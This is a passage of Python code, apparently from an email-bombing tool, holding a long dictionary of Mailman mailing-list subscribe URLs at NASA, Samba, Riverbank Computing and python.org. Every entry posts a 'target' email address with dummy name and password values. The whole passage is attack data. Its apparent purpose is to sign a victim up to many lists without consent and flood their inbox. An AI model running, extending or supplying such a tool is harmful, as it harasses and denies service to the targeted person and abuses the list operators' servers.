                'url': 'https://lists.nasa.gov/mailman/subscribe/jpss-ground-xipt',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/jpss-ground-xipt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HMRtQ': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/jsc-mer-and-core-eva-operators',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/jsc-mer-and-core-eva-operators',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OHDgH': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/jsc-mer-eva-chamber-summary',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/jsc-mer-eva-chamber-summary',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wzvhF': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/jsc-mer-eva-mission-summary',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/jsc-mer-eva-mission-summary',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aITJc': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/jsc-mer-eva-operators',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/jsc-mer-eva-operators',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VFCUu': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/jsc-mer-eva-sim-summary',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/jsc-mer-eva-sim-summary',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YMCUJ': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/larc-ultimate-club',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/larc-ultimate-club',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rEXGI': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/nasa-social-announce',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/nasa-social-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QNpld': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/nh-announce',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/nh-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RsdWF': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/nh-weekly',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/nh-weekly',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wRHOb': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/roman-news',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/roman-news',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JutgQ': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/sigma-series',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/sigma-series',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XSHHq': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/wp-blog-users',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/wp-blog-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uEVye': {
                'url': 'https://www.riverbankcomputing.com/mailman/subscribe/eric',
                'token_url': 'https://www.riverbankcomputing.com/mailman/listinfo/eric',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZkTeX': {
                'url': 'https://www.riverbankcomputing.com/mailman/subscribe/pyqt',
                'token_url': 'https://www.riverbankcomputing.com/mailman/listinfo/pyqt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WtSOK': {
                'url': 'https://www.riverbankcomputing.com/mailman/subscribe/qscintilla',
                'token_url': 'https://www.riverbankcomputing.com/mailman/listinfo/qscintilla',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JFkis': {
                'url': 'https://lists.samba.org/mailman/subscribe/ccache',
                'token_url': 'https://lists.samba.org/mailman/listinfo/ccache',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TJnVQ': {
                'url': 'https://lists.samba.org/mailman/subscribe/cifs-protocol',
                'token_url': 'https://lists.samba.org/mailman/listinfo/cifs-protocol',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iuqtT': {
                'url': 'https://lists.samba.org/mailman/subscribe/distcc',
                'token_url': 'https://lists.samba.org/mailman/listinfo/distcc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UjUpw': {
                'url': 'https://lists.samba.org/mailman/subscribe/jcifs',
                'token_url': 'https://lists.samba.org/mailman/listinfo/jcifs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eWMWQ': {
                'url': 'https://lists.samba.org/mailman/subscribe/linux',
                'token_url': 'https://lists.samba.org/mailman/listinfo/linux',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fQqhY': {
                'url': 'https://lists.samba.org/mailman/subscribe/linux-cifs-client',
                'token_url': 'https://lists.samba.org/mailman/listinfo/linux-cifs-client',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GMyPf': {
                'url': 'https://lists.samba.org/mailman/subscribe/linux-nisplus',
                'token_url': 'https://lists.samba.org/mailman/listinfo/linux-nisplus',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'caZqp': {
                'url': 'https://lists.samba.org/mailman/subscribe/rsync',
                'token_url': 'https://lists.samba.org/mailman/listinfo/rsync',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cuuOT': {
                'url': 'https://lists.samba.org/mailman/subscribe/rsync-announce',
                'token_url': 'https://lists.samba.org/mailman/listinfo/rsync-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GElQl': {
                'url': 'https://lists.samba.org/mailman/subscribe/rsync-cvs',
                'token_url': 'https://lists.samba.org/mailman/listinfo/rsync-cvs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XFasi': {
                'url': 'https://lists.samba.org/mailman/subscribe/samba',
                'token_url': 'https://lists.samba.org/mailman/listinfo/samba',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Vbnvd': {
                'url': 'https://lists.samba.org/mailman/subscribe/samba-announce',
                'token_url': 'https://lists.samba.org/mailman/listinfo/samba-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MnqRV': {
                'url': 'https://lists.samba.org/mailman/subscribe/samba-cvs',
                'token_url': 'https://lists.samba.org/mailman/listinfo/samba-cvs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AdAEp': {
                'url': 'https://lists.samba.org/mailman/subscribe/samba-docs',
                'token_url': 'https://lists.samba.org/mailman/listinfo/samba-docs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WpyCH': {
                'url': 'http://lists.samba.org/cgi-bin/mailman/subscribe/samba-it',
                'token_url': 'http://lists.samba.org/cgi-bin/mailman/listinfo/samba-it',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QlJuA': {
                'url': 'https://lists.samba.org/mailman/subscribe/samba-ntdom',
                'token_url': 'https://lists.samba.org/mailman/listinfo/samba-ntdom',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WNzAe': {
                'url': 'https://lists.samba.org/mailman/subscribe/samba-technical',
                'token_url': 'https://lists.samba.org/mailman/listinfo/samba-technical',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cskeg': {
                'url': 'https://lists.samba.org/mailman/subscribe/samba-vms',
                'token_url': 'https://lists.samba.org/mailman/listinfo/samba-vms',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qHUBW': {
                'url': 'https://lists.samba.org/mailman/subscribe/smb-clients',
                'token_url': 'https://lists.samba.org/mailman/listinfo/smb-clients',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zZHyH': {
                'url': 'https://mail.python.org/mailman/subscribe/aberdeen',
                'token_url': 'https://mail.python.org/mailman/listinfo/aberdeen',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JGCiy': {
                'url': 'https://mail.python.org/mailman/subscribe/abqpy',
                'token_url': 'https://mail.python.org/mailman/listinfo/abqpy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tqpLl': {
                'url': 'https://mail.python.org/mailman/subscribe/advocacy',
                'token_url': 'https://mail.python.org/mailman/listinfo/advocacy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gGDYM': {
                'url': 'https://mail.python.org/mailman/subscribe/archiver-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/archiver-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VjAeP': {
                'url': 'https://mail.python.org/mailman/subscribe/astropy',
                'token_url': 'https://mail.python.org/mailman/listinfo/astropy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'brcLJ': {
                'url': 'https://mail.python.org/mailman/subscribe/bangpypers',
                'token_url': 'https://mail.python.org/mailman/listinfo/bangpypers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QEsLV': {
                'url': 'https://mail.python.org/mailman/subscribe/baypiggies',
                'token_url': 'https://mail.python.org/mailman/listinfo/baypiggies',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AxtlD': {
                'url': 'https://mail.python.org/mailman/subscribe/belgium',
                'token_url': 'https://mail.python.org/mailman/listinfo/belgium',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lFAMz': {
                'url': 'https://mail.python.org/mailman/subscribe/borgbackup',
                'token_url': 'https://mail.python.org/mailman/listinfo/borgbackup',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zCRst': {
                'url': 'https://mail.python.org/mailman/subscribe/boston',
                'token_url': 'https://mail.python.org/mailman/listinfo/boston',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xUZsc': {
                'url': 'https://mail.python.org/mailman/subscribe/bundle-sponsorship-wg',
                'token_url': 'https://mail.python.org/mailman/listinfo/bundle-sponsorship-wg',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TPYhD': {
                'url': 'https://mail.python.org/mailman/subscribe/canberra-pug',
                'token_url': 'https://mail.python.org/mailman/listinfo/canberra-pug',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jtsKJ': {
                'url': 'https://mail.python.org/mailman/subscribe/centraloh',
                'token_url': 'https://mail.python.org/mailman/listinfo/centraloh',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xPeVY': {
                'url': 'https://mail.python.org/mailman/subscribe/charleston',
                'token_url': 'https://mail.python.org/mailman/listinfo/charleston',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YOQhR': {
                'url': 'https://mail.python.org/mailman/subscribe/chennaipy',
                'token_url': 'https://mail.python.org/mailman/listinfo/chennaipy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FiCow': {
                'url': 'https://mail.python.org/mailman/subscribe/chicago',
                'token_url': 'https://mail.python.org/mailman/listinfo/chicago',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kkIJR': {
                'url': 'https://mail.python.org/mailman/subscribe/chicago-sig-organizers',
                'token_url': 'https://mail.python.org/mailman/listinfo/chicago-sig-organizers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lqWAT': {
                'url': 'https://mail.python.org/mailman/subscribe/chipy-announce',
                'token_url': 'https://mail.python.org/mailman/listinfo/chipy-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tBEMG': {
                'url': 'https://mail.python.org/mailman/subscribe/compiler-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/compiler-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WduTn': {
                'url': 'https://mail.python.org/mailman/subscribe/conduct',
                'token_url': 'https://mail.python.org/mailman/listinfo/conduct',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yIKta': {
                'url': 'https://mail.python.org/mailman/subscribe/conferences',
                'token_url': 'https://mail.python.org/mailman/listinfo/conferences',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PplNg': {
                'url': 'https://mail.python.org/mailman/subscribe/cplusplus-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/cplusplus-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bOtYg': {
                'url': 'https://mail.python.org/mailman/subscribe/cryptography-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/cryptography-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GtBdS': {
                'url': 'https://mail.python.org/mailman/subscribe/csv',
                'token_url': 'https://mail.python.org/mailman/listinfo/csv',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pvrua': {
                'url': 'https://mail.python.org/mailman/subscribe/cython-devel',
                'token_url': 'https://mail.python.org/mailman/listinfo/cython-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VeXUr': {
                'url': 'https://mail.python.org/mailman/subscribe/db-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/db-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JQYCl': {
                'url': 'https://mail.python.org/mailman/subscribe/dcpiggies',
                'token_url': 'https://mail.python.org/mailman/listinfo/dcpiggies',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XoNyX': {
                'url': 'https://mail.python.org/mailman/subscribe/dehradun-python',
                'token_url': 'https://mail.python.org/mailman/listinfo/dehradun-python',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZIOgE': {
                'url': 'https://mail.python.org/mailman/subscribe/django-india',
                'token_url': 'https://mail.python.org/mailman/listinfo/django-india',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CGhBo': {
                'url': 'https://mail.python.org/mailman/subscribe/doc-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/doc-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SEtAl': {
                'url': 'https://mail.python.org/mailman/subscribe/ecuador',
                'token_url': 'https://mail.python.org/mailman/listinfo/ecuador',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TcQHZ': {
                'url': 'https://mail.python.org/mailman/subscribe/edinburgh',
                'token_url': 'https://mail.python.org/mailman/listinfo/edinburgh',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZytfU': {
                'url': 'https://mail.python.org/mailman/subscribe/elections',
                'token_url': 'https://mail.python.org/mailman/listinfo/elections',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lvlwu': {
                'url': 'https://mail.python.org/mailman/subscribe/elections-wg',
                'token_url': 'https://mail.python.org/mailman/listinfo/elections-wg',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LFhUl': {
                'url': 'https://mail.python.org/mailman/subscribe/email-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/email-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rSPTl': {
                'url': 'https://mail.python.org/mailman/subscribe/europython',
                'token_url': 'https://mail.python.org/mailman/listinfo/europython',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cYOdf': {
                'url': 'https://mail.python.org/mailman/subscribe/europython-announce',
                'token_url': 'https://mail.python.org/mailman/listinfo/europython-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mKGqK': {
                'url': 'https://mail.python.org/mailman/subscribe/europython-improve',
                'token_url': 'https://mail.python.org/mailman/listinfo/europython-improve',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PTMjG': {
                'url': 'https://mail.python.org/mailman/subscribe/europython-volunteer-announce',
                'token_url': 'https://mail.python.org/mailman/listinfo/europython-volunteer-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NSWLq': {
                'url': 'https://mail.python.org/mailman/subscribe/euroscipy',
                'token_url': 'https://mail.python.org/mailman/listinfo/euroscipy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DDUlF': {
                'url': 'https://mail.python.org/mailman/subscribe/execnet-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/execnet-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uiOWf': {
                'url': 'https://mail.python.org/mailman/subscribe/expat-bugs',
                'token_url': 'https://mail.python.org/mailman/listinfo/expat-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AEtdu': {
                'url': 'https://mail.python.org/mailman/subscribe/expat-checkins',
                'token_url': 'https://mail.python.org/mailman/listinfo/expat-checkins',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EfQSx': {
                'url': 'https://mail.python.org/mailman/subscribe/expat-discuss',
                'token_url': 'https://mail.python.org/mailman/listinfo/expat-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MofsC': {
                'url': 'https://mail.python.org/mailman/subscribe/flask',
                'token_url': 'https://mail.python.org/mailman/listinfo/flask',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'brZYX': {
                'url': 'https://mail.python.org/mailman/subscribe/fosdem',
                'token_url': 'https://mail.python.org/mailman/listinfo/fosdem',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PGwsY': {
                'url': 'https://mail.python.org/mailman/subscribe/glasgow',
                'token_url': 'https://mail.python.org/mailman/listinfo/glasgow',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JjlLz': {
                'url': 'https://mail.python.org/mailman/subscribe/grants-discuss',
                'token_url': 'https://mail.python.org/mailman/listinfo/grants-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RuafR': {
                'url': 'https://mail.python.org/mailman/subscribe/group-organizers',
                'token_url': 'https://mail.python.org/mailman/listinfo/group-organizers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xZUwN': {
                'url': 'https://mail.python.org/mailman/subscribe/gsoc-blogs',
                'token_url': 'https://mail.python.org/mailman/listinfo/gsoc-blogs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lkfeL': {
                'url': 'https://mail.python.org/mailman/subscribe/gsoc-general',
                'token_url': 'https://mail.python.org/mailman/listinfo/gsoc-general',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Plkvd': {
                'url': 'https://mail.python.org/mailman/subscribe/gurkentruppe',
                'token_url': 'https://mail.python.org/mailman/listinfo/gurkentruppe',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'exBqV': {
                'url': 'https://mail.python.org/mailman/subscribe/healthcare',
                'token_url': 'https://mail.python.org/mailman/listinfo/healthcare',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
